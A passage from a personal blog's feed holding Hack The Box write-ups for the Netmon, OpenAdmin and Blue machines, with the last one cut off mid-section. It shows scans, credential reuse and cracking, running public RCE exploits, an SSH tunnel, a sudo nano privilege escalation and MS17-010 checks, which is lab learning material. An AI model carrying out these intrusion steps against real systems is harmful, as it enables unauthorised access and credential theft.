</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 15:25 CET
Nmap scan report for $target_ip
Host is up (0.056s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
| 02-03-19  07:08AM       &lt;DIR&gt;          Users
|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/12%OT=21%CT=1%CU=31327%PV=Y%DS=2%DC=T%G=Y%TM=6026908
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M54DNW8ST11%O2=M54
OS:DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W
OS:1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%
OS:O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-02-12T14:28:15
|_  start_date: 2021-02-12T14:02:36

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   59.00 ms 10.10.14.1
2   59.12 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.62 seconds
</code></pre></td></tr></table>
</div>
</div><p>We find a few interesting services :</p>
<ul>
<li>FTP server (21/tcp) : Microsoft ftpd, with anonymous login enabled ;</li>
<li>Web server (80/tcp) : Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) ;</li>
<li>Remote powershell (5985/tcp) ;</li>
<li>SMB and Netbios related services on ports 135/tcp, 139/tcp and 445/tcp ;</li>
<li>HTTPAPI httpd 2.0 (SSDP/UPnP) on 47001/tcp ;</li>
<li>Several high ports fo RPC.</li>
</ul>
<p>Nikto scan reveals <code>PRTG</code> version <code>18.1.37.13946</code>, and the webpage displays a login page.</p>
<p></p>
<p>Default and common credentials won&rsquo;t work here.</p>
<p>Looking up <code>PRTG</code> on <code>searchploit</code> won&rsquo;t give us much : an authenticated RCE and a DoS exploit&hellip; and yes it works! But as fas I know, it is useless in our case. It means we&rsquo;ll have to dig deeper. Before that, let&rsquo;s continue to sratch the surface for other services, we are looking for an easy win! :)</p>
<p>We can also enumerate smb shares :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $target_ip
</code></pre></td></tr></table>
</div>
</div><p>but nothing comes up!</p>
<p>Let&rsquo;s explore the FTP server. Here, we have access to quite a lot of files such as :</p>
<ul>
<li>Program Files ;</li>
<li>Program Files (x86) (we now know that our OS is 64 bits) ;</li>
<li>Users, Windows, Inetpub, etc.</li>
</ul>
<p>In the <code>Users\Public</code> folder we will find our user flag.</p>
<p></p>
<p>Now, I am guessing that the most relevant folder will be <code>/Program Files (x86)/PRTG Network Monitor</code> in which we might find useful info such as installation logs, and maybe even credentials if we are super lucky.</p>
<p>So far, we haven&rsquo;t found much&hellip; My guess is still with PRTG logs or something similar. I will then explore PRTG folder for anything interesting, and also common places we might have access to.</p>
<p>In order to make exploration more easier, I am using <code>FileZilla</code>.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Enumerating username in the &ldquo;Forgot password&rdquo; page, tells us that the default <code>ptrgadmin</code> user exists :</p>
<p></p>
<p>Notice the slightly different error message when testing with a fake username (username == <code>zjdpdjpo</code>) :</p>
<p></p>
<p>While researching on internet where PRTG stores its credentials, I came across a few pages where it seems that our version leaks clear text password in the <code>ProgramData</code> folder. Now, I tried to access this folder from my FTP client and couldn&rsquo;t do it&hellip; I have been stuck here for HOURS! So I cheated, and checked official walk through. It turns out, I made a typo&hellip; and one can access the said folder and get some juicy files, especially <code>PRTG Configuration.old.bak</code>. Inside this file, we&rsquo;ll find Graal (or, do we?) :</p>
<p></p>
<p>Once again, and I have no idea why this time (probably another typo?) I also went stuck for too long. The password in the backup file ends in 2018, but unfortunately it doesn&rsquo;t work. One can assume it is an old password, and the year has changed, so has the password. Hence, I tried to replace the year with 2019, 2020, 2021 and even 2022 (current year + 1)&hellip; Nothing worked&hellip; I was really feeling down and cheated, again. It happens that the second password I tested was the correct one! I tried it again, and this time, it worked and I was finally inside the admin panel!</p>
<p>Now that we are authenticated, it is finally time to check our <a href="https://www.exploit-db.com/exploits/46527" target="_blank" rel="noopener noreffer ">Authenticated RCE we found earlier</a>.</p>
<p>We need to grab our authenticated cookie, <code>Burp Suite</code> can do that easily, then run the following command :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">./prtg-exploit.sh -u http://$target_ip -c &#34;_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1&#34;
</code></pre></td></tr></table>
</div>
</div><p>Once it is done, the script should have created a new admin user called <code>pentest</code>.</p>
<p>Now, remember we also found a remote powershell running? Time to use it! I found that using a Powershell&rsquo;s docker was pretty easy :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">docker run -it  quickbreach/powershell-ntlm
</code></pre></td></tr></table>
</div>
</div><p>From here, we connect to our remote machine :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Enter-PSsession -ComputerName $target_ip -Authentication Negotiate -Credential pentest
</code></pre></td></tr></table>
</div>
</div><p>One we are in as <code>SYSTEM</code>, we simply browse to the flag dir and display it :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>While everything seemed pretty straightforward I spent way more time than I care to admit for stupid mistakes on my side. Which in the end made it a very exhausting box for me. Once again, we saw how nasty a few misconfiguration + CVE can be!</p>
]]></description></item><item><title>HTB - OpenAdmin without MetaSploit</title><link>https://www.masoopy.com/htb-openadmin-without-metasploit/</link><pubDate>Mon, 08 Feb 2021 12:42:29 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-openadmin-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/OpenAdmin.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>The importance to also patch your &ldquo;applications&rdquo;, and not just your services.</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/222" target="_blank" rel="noopener noreffer ">HTB - OpenAdmin</a></p>
<h2 id="recon">Recon</h2>
<p>Again, this is an HTB box, so recon is mainly active, and I feel like active recon == enum.</p>
<p>Still, we can check :</p>
<ul>
<li>Name of the box : OpenAdmin ;</li>
<li>OS &ldquo;type&rdquo;, : Linux :</li>
<li>Hints given on HTB website, information section :</li>
</ul>
<p></p>
<h2 id="enum">Enum</h2>
<p>As always, we start with an nmap scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Thu Jan 28 15:27:52 2021 as: nmap -T4 -A -p- -oA HTB/OpenAdmin/nmap $target_ip
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/28%OT=22%CT=1%CU=33687%PV=Y%DS=2%DC=T%G=Y%TM=6012CA1
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   22.95 ms 10.10.14.1
2   24.65 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 28 15:28:39 2021 -- 1 IP address (1 host up) scanned in 47.14 seconds

</code></pre></td></tr></table>
</div>
</div><p>We find 2 services : ssh and Apache, both on standard ports. I like to check <code>searchsploit</code> for every service + version I find, in order to see if there any big vulnerability. In general, SSH isn&rsquo;t something that I&quot;ll try to attack right away. It is more of a &ldquo;last chance&rdquo; path, with brute force.</p>
<h3 id="web-scanning">Web scanning</h3>
<p>In our case, we found a web server running Apache, but th version doesn&rsquo;t seem vulnerable. So, let&rsquo;s fire <code>nikto</code> and <code>dirbuster</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">nikto -h http://$target_ip
</code></pre></td></tr></table>
</div>
</div><p>And dirbuster like so :</p>
<p></p>
<p>Dirbuster, will find an interesting dir &ldquo;ona&rdquo;, browsing to this resource we discovered it is running OpenNetAdmin version 18.1.1 which is outdated and probably vulnerable&hellip;</p>
<p></p>
<p>Indeed, after a quick search, we discover that it is vulnerable to Remote Code Execution (RCE), one of the most dangerous vuln we could find. Awesome!</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="getting-initial-shell">Getting initial shell</h3>
<p>The vuln in question can be found here : <a href="https://www.exploit-db.com/exploits/47691" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/47691</a> it is a simple Python script that will grant you a shell access on the remote machine.</p>
<p>Unfortunately, this shell only runs as <code>www-data</code>, the default <code>Apache</code> user and with <code>/sbin/nologin</code> shell. Still, we can still look around. I usually check what files I have access to :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">find / -xdev -type f -user $current_user
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check who was access to sudo :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">ls -lhtrR /etc/sudo*
</code></pre></td></tr></table>
</div>
</div><p>I also like to check what users are on the system and see if I can access some files inside their home&rsquo;s folders :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">cat /etc/passwd &amp;&amp; ls -lhtrR /home/
</code></pre></td></tr></table>
</div>
</div><p>And of course in our case, explore the web root folders.</p>
<p>Doing so, we discover two users : <code>joanna</code> and <code>jimmy</code> and an interesting set of credentials inside <code>/var/www/html/local/ona/config</code>.</p>
<p>It happens that the password from this file is actually jimmy&rsquo;s account SSH password. We now have a real bash shell, in a real terminal, with bash completion, hurray!</p>
<p>Once again, we check for common stuff, like what files do we own, and sudo rights :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo -l
</code></pre></td></tr></table>
</div>
</div><p>So, no sudo rights for us, however, we discover a new website that only runs on localhost. This website is very important, as we can see that, once logged as Jimmy, it will send us the SSH private key of Joanna.</p>
<p>I decided to create an SSH tunnel :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">ssh -L 52846:127.0.0.1:52846 -N -f jimmy@$target_ip
</code></pre></td></tr></table>
</div>
</div><p>And to modify the login page in order to get rid of authentication :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">&lt;?php
            $msg = &#39;&#39;;

            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
                  header(&#34;Location: /main.php&#34;);
              } else {
                  $msg = &#39;Wrong username or password.&#39;;
              }
            }
         ?&gt;
</code></pre></td></tr></table>
</div>
</div><p>becomes :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">          &lt;?php
            $msg = &#39;&#39;;

            if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) {
              if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; $_POST[&#39;password&#39;] == &#39;plop&#39;) {
            //  if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) {
                  $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;;
                  header(&#34;Location: /main.php&#34;);
              } else {
                  $msg = &#39;Wrong username or password.&#39;;
              }
            }
         ?&gt;
</code></pre></td></tr></table>
</div>
</div><p>We can now browse to 127.0.0.1:52846 and log in with <code>jimmy</code> // <code>plop</code>.</p>
<p>And bingo! We got Joanna&rsquo;s key with an extra tip :</p>
<blockquote>
<p>Don&rsquo;t forget your &ldquo;ninja&rdquo; password</p>
</blockquote>
<p>Of course, Joanna-s key is encrypted&hellip; We save it as id_joanna and hash it :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">python /usr/share/john/ssh2john.py id_joanna &gt; joanna.hash
</code></pre></td></tr></table>
</div>
</div><p>Now that we have the hashed version, time to crask it :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">john -wordlist=/usr/share/wordlists/rockyou.txt joanna.hash 
</code></pre></td></tr></table>
</div>
</div><p>We finally, have joanna&rsquo;s ssh key password, we can now connect to the server as her!</p>
<h3 id="privesc">PrivEsc</h3>
<p>As usual, we do all our basic checks. Doing so, we will notice :</p>
<ul>
<li>We have access to user.txt flag ;</li>
<li>We have access to <code>sudo /bin/nano /opt/priv</code> without password.</li>
</ul>
<p>Accessing root password which is always located in <code>/root/root.txt</code> is a simple matter of running <code>nano</code> as root (with <code>sudo</code>) and entering command mode with <code>^R</code> + <code>^X</code> to <code>cat</code> the flag file).</p>
<p>We now got <code>root.txt</code>!</p>
<h2 id="outro">Outro</h2>
<p>As we have just seen, one can obtain root access to a machine via &ldquo;third party&rdquo; application while the rest of the system is up to date. So, make sure to keep everything updated!</p>
]]></description></item><item><title>HTB - Blue without MetaSploit</title><link>https://www.masoopy.com/htb-blue-without-metasploit/</link><pubDate>Sat, 30 Jan 2021 16:37:44 +0100</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-blue-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/02/Blue.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>A good ol' vuln to get starting!</p>
<p>This will be my first real tutorial, so I&rsquo;ll try to explain the basics of what I am doing. Please bear in mind that I am very new to hacking, probably like you are. I am merely sharing my knowledge and by doing so I am making sure I understood what I did. Please correct me if you find anything wrong, or ask question if you need to! I&rsquo;ll be happy to engage a discussion.</p>
<p>NB : The following notes use $target_ip = IP of the target machine. This is more convenient when machine changes its IP.</p>
<p>A note about “sudo”. I am a firm believer in the “least privileges” methodology, like never use your admin account on AD domain for day to day use, and never use sudo if you don&rsquo;t need to. For example, search a package with “apt search X” and install it wish &ldquo;sudo apt install X&rdquo;. However, in case of Kali and nmap, I noticed that in quite often requires root depending of the flag you use. Since, I am no expert (yet), I will l run nmap (and many other Kali tools) with sudo! I do not log in as root, but as a regular user I created but I almost always use “sudo”.</p>
<p>I will process simply by following the 5 stages of Ethical Hacking.</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/51" target="_blank" rel="noopener noreffer ">HTB - Blue</a></p>
<h2 id="recon">Recon</h2>
<p>Doing HTB boxes, there will be no proper reconnaissance phase; since Googling for the box will obviously leave to solution which we do not want&hellip; Let&rsquo;s just say we can use the name to have a guess. Here, a Windows machine called Blue probably means we&rsquo;ll have to deal with MS17-010. So I&rsquo;ll pay close attention to anything related to SMB.</p>
<h2 id="enum">Enum</h2>
<p>Let&rsquo;s fire a quick nmap scan ;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -p- $target_ip
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>This quick nmap command will scan for all TCP ports, then, once done we will gather more in depth results by adding -A flag on specified ports (the one that responded from the previous step).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p $target_ip
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>NB : here, I just ignored some high ports 49xxx/tcp because this is not a real life test and I know that what I am looking for is related to SMB (445/tcp).</p>
<p>In parallel, I like to launch a Nessus basic scan on ALL ports (thanks @tcm for the tips) :</p>
<p></p>
<p>Like we guessed, it seems we will have to play with MS17-010 vuln, let&rsquo;s check that with nmap dedicated script :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap --script smb-vuln-ms17-010 $target_ip
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>It is becoming more and clear that this machine is vulnerable to ms17-10.</p>
<p>Since saw some SMB running; let&rsquo;s enumerate it :</p>
<p>NB : note the quadruple &ldquo;&rdquo;, this is because it normally has only 2 but need escaping each time, hence the 4.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">smbclient -L $target_ip
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>Since we found a few share let&rsquo;s try to connect to each one of them anonymously, for example with the share called &ldquo;Share&rdquo;:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">smbclient $target_ipShare
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>Keep notes of what shares you have access to. You may differentiate where you have &ldquo;listing&rdquo; access and where you don&rsquo;t.</p>
<p>Now let&rsquo;s try to gain exploit this machine.</p>
<h2 id="gaining-access-exploitation">Gaining Access (exploitation)</h2>
<p>My goal is to exploit without MetaSploit, if you don&rsquo;t know why, check this blog post.</p>
<p>Searching on the internet, I came around this GitHub that seems to be able to do the job: <a href="https://github.com/helviojunior/MS17-010" target="_blank" rel="noopener noreffer ">https://github.com/helviojunior/MS17-010</a>.</p>
<p>According to the repo we need to install impacket and mysmb, I&rsquo;ll let you do that, then we can use checker.py to see if we find any named pipe (since it is a safe way to exploit this) :</p>
<p>cd into the clone repo then run :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">python2 checker.py $target_ip
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>Unfortunately, we have no named pipes available&hellip; However, according to the repo :</p>
<blockquote>
<p><strong>Eternalblue</strong> requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows &lt; 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.</p>
<p><strong>Eternalchampion</strong> requires access to named pipe. The exploit has no chance to crash a target.</p>
<p><strong>Eternalromance</strong> requires access to named pipe. The exploit can target Windows &lt; 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.</p>
